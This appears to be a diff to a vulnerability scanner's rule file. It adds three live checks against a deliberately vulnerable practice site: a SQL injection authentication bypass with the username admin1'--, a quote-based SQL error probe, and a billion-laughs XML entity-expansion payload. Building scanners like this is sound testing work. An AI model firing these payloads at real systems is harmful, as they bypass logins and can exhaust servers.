@@ -37670,6 +37670,101 @@ const pentestGroundRestflawEvalCodeInjectionRouteLiveOracle: Rule = async (ctx) 
   };
 };
 
+const pentestGroundRestflawTokensSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/pentest-ground\.com:9000/i.test(pageUrl)) return NEGATIVE;
+  const tokensUrl = new URL("/tokens", pentestGroundRestflawProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(tokensUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "admin1'--", password: "x" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let parsed: { access?: { token?: { id?: string }; user?: { name?: string } } };
+  try {
+    parsed = JSON.parse(doc.body) as typeof parsed;
+  } catch {
+    return NEGATIVE;
+  }
+  const tokenId = parsed.access?.token?.id;
+  const userName = parsed.access?.user?.name;
+  if (!tokenId || !/admin/i.test(userName || "")) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      tokensUrl,
+      userName,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Pentest-Ground RestFlaw POST /tokens with username admin1'-- returns admin access token — SQL injection authentication bypass route oracle"
+    }
+  };
+};
+
+const pentestGroundRestflawTokensSqliErrorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/pentest-ground\.com:9000/i.test(pageUrl)) return NEGATIVE;
+  const tokensUrl = new URL("/tokens", pentestGroundRestflawProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(tokensUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "x", password: "'" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  const sqliOk =
+    /sqlite3\.OperationalError/i.test(doc.body) ||
+    (/OperationalError/i.test(doc.body) && /unrecognized token/i.test(doc.body));
+  if (!sqliOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      tokensUrl,
+      snippet: doc.body.match(/sqlite3\.OperationalError[^\n<]{0,120}/i)?.[0] || doc.body.slice(0, 240).trim(),
+      note: "Pentest-Ground RestFlaw POST /tokens with malformed password triggers sqlite3.OperationalError — SQL injection error-disclosure route oracle"
+    }
+  };
+};
+
+const pentestGroundRestflawSearchXxeRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/pentest-ground\.com:9000/i.test(pageUrl)) return NEGATIVE;
+  const searchUrl = new URL("/search", pentestGroundRestflawProbeOrigin(ctx)).toString();
+  const xxeBody =
+    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root><user>&lol3;</user></root>';
+  const doc = await ctx.probe.get(searchUrl, {
+    method: "POST",
+    body: xxeBody,
+    headers: { "Content-Type": "application/xml" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  const xxeOk =
+    /entity reference loop/i.test(doc.body) ||
+    /Detected an entity reference loop/i.test(doc.body) ||
+    (/root:.*passwd/i.test(doc.body) && /:\w+:/.test(doc.body));
+  if (!xxeOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      searchUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Pentest-Ground RestFlaw POST /search with billion-laughs XML entity expansion triggers parser error — XXE route oracle"
+    }
+  };
+};
+
 // --- Judgement Day AI red team arena (judgement-day-khaki.vercel.app) -----------------
 const CLIENT_JUDGEMENT_DAY_ARENA_RES: { label: string; re: RegExp }[] = [
   {
@@ -65643,6 +65738,9 @@ export const RULES: Record<string, Rule> = {
   theInternetAbtestRouteLiveOracle,
   pentestGroundDvwaWeakIdRouteLiveOracle,
   pentestGroundRestflawEvalCodeInjectionRouteLiveOracle,
+  pentestGroundRestflawTokensSqliRouteLiveOracle,
+  pentestGroundRestflawTokensSqliErrorRouteLiveOracle,
+  pentestGroundRestflawSearchXxeRouteLiveOracle,
   clientSideJudgementDayArenaEvidence,
   clientSideCahyodVulnerableLabEvidence,
   clientSideCtfchallengeEvidence,
